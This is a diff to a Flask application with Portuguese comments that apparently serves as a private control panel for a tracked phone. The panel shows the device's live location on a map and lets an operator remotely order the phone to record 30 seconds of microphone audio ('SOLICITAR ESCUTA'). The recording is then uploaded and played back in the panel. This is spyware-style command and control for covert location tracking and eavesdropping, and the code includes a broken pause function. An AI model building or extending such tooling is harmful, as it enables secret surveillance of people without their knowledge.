@@ -32,11 +32,15 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
         .status-tag { background: #166534; color: #4ade80; padding: 2px 8px; border-radius: 4px; font-size: 11px; }
         .btn-maps { display: block; width: 100%; background: #22c55e; color: #ffffff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; margin-bottom: 15px; }
         
-        /* BLOCO DE ESCUTA INTELIGENTE */
+        /* AUDIO CONTROLS CUSTOM */
         .audio-box { background: #070f15; border: 1px solid #1e293b; padding: 15px; border-radius: 8px; text-align: center; }
         .btn-trigger-audio { background: #ea580c; color: #fff; font-weight: bold; border: none; padding: 12px; width: 100%; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 12px; letter-spacing: 1px; margin-bottom: 12px; }
         .btn-trigger-audio:disabled { background: #334155; color: #94a3b8; cursor: not-allowed; }
-        audio { width: 100%; outline: none; filter: invert(0.9) hue-rotate(180deg); }
+        
+        .custom-controls { display: flex; gap: 10px; justify-content: center; margin-top: 10px; }
+        .btn-audio-control { background: #1e293b; border: 1px solid #38bdf8; color: #38bdf8; padding: 8px 16px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px; text-transform: uppercase; }
+        .btn-audio-control:hover { background: #38bdf8; color: #070f15; }
+        audio { width: 100%; outline: none; filter: invert(0.9) hue-rotate(180deg); margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -51,9 +55,6 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 <input type="text" id="target_id" name="target_id" placeholder="EX: NX-MOTO-ZETA" value="{{ id_buscado if id_buscado else '' }}" required><br>
                 <button type="submit">Conectar Sinal</button>
             </form>
-            {% if erro %}
-                <div style="color:#f87171; font-size:12px; margin-top:10px;">{{ erro }}</div>
-            {% endif %}
         </div>
         
         {% if info_moto %}
@@ -76,8 +77,15 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 </a>
 
                 <div class="audio-box">
-                    <button id="btn_audio" class="btn-trigger-audio" onclick="dispararGravacao()">🎙️ Gravar 30s de Áudio</button>
-                    <audio id="audio_player" controls></audio>
+                    <button id="btn_audio" class="btn-trigger-audio" onclick="dispararGravacao()">🎙️ SOLICITAR ESCUTA DE 30S</button>
+                    
+                    <div class="custom-controls">
+                        <button class="btn-audio-control" onclick="forçarPlay()">▶ Ouvir Áudio</button>
+                        <button class="btn-audio-control" onclick="forçarPause()">⏸ Pausar</button>
+                    </div>
+                    
+                    <audio id="audio_player" controls preload="auto"></audio>
+                    <div id="audio_status" style="font-size:10px; color:#64748b; margin-top:5px;">Nenhum áudio carregado.</div>
                 </div>
             </div>
 
@@ -90,18 +98,29 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                 L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {}).addTo(map);
                 let marker = L.marker([lat, lon]).addTo(map);
 
-                // Função que avisa o servidor que você quer escutar o celular
                 async function dispararGravacao() {
                     const btn = document.getElementById('btn_audio');
                     btn.disabled = true;
-                    btn.innerText = "⏳ Enviando Ordem pro Celular...";
-                    
+                    btn.innerText = "⏳ Gravando no Celular... Aguarde 35s";
                     await fetch('/api/ordem_audio/{{ id_buscado }}', { method: 'POST' });
-                    
                     setTimeout(() => {
-                        btn.innerText = "🎙️ Gravar 30s de Áudio";
+                        btn.innerText = "🎙️ SOLICITAR ESCUTA DE 30S";
                         btn.disabled = false;
-                    }, 40000); // Trava o botão por 40s enquanto o celular grava e transmite
+                    }, 38000);
+                }
+
+                // Funções que forçam o player a rodar ignorando as travas do navegador
+                function forçarPlay() {
+                    const player = document.getElementById('audio_player');
+                    if(player.src) {
+                        player.play().catch(e => alert("Clique novamente para reproduzir"));
+                    } else {
+                        alert("Ainda não há áudio capturado. Clique em SOLICITAR ESCUTA primeiro.");
+                    }
+                }
+
+                function forçarPause() {
+                    document.getElementById('audio_player').get(0).pause();
                 }
 
                 setInterval(async () => {
@@ -118,11 +137,14 @@ HTML_DASHBOARD_PRIVADO = """<!DOCTYPE html>
                             map.panTo(newPos);
                             document.getElementById('lnk_maps').href = `https://www.google.com/maps/search/?api=1&query=${data.lat},${data.lon}`;
                             
-                            // Se o celular tiver enviado o áudio solicitado, bota no player
+                            // Carrega o áudio e força o status a mudar
                             if (data.audio_b64 && data.audio_b64 !== currentAudioB64) {
                                 currentAudioB64 = data.audio_b64;
                                 const player = document.getElementById('audio_player');
                                 player.src = "data:audio/wav;base64," + data.audio_b64;
+                                player.load();
+                                document.getElementById('audio_status').innerText = "✅ NOVO ÁUDIO DISPONÍVEL! CLIQUE EM OUVIR ÁUDIO.";
+                                document.getElementById('audio_status').style.color = "#34d399";
                             }
                         }
                     } catch (e) {}
@@ -153,7 +175,6 @@ def api_status(device_id):
         return jsonify(db_dispositivos[device_id]), 200
     return jsonify({"error": "Not found"}), 404
 
-# Dispara a ordem de gravação para o dispositivo solicitado
 @app.route('/api/ordem_audio/<device_id>', methods=['POST'])
 def ordem_audio(device_id):
     if device_id in db_dispositivos:
@@ -180,10 +201,9 @@ def update():
     if data.get("audio_b64"):
         db_dispositivos[device_id]["audio_b64"] = data.get("audio_b64")
         
-    # Retorna para o celular se o site clicou no botão pedindo gravação
     checar_ordem = db_dispositivos[device_id].get("comando_gravacao", False)
     if checar_ordem:
-        db_dispositivos[device_id]["comando_gravacao"] = False # Desliga a chave para nao repetir
+        db_dispositivos[device_id]["comando_gravacao"] = False
         
     return jsonify({"comando_gravacao": checar_ordem}), 200
 
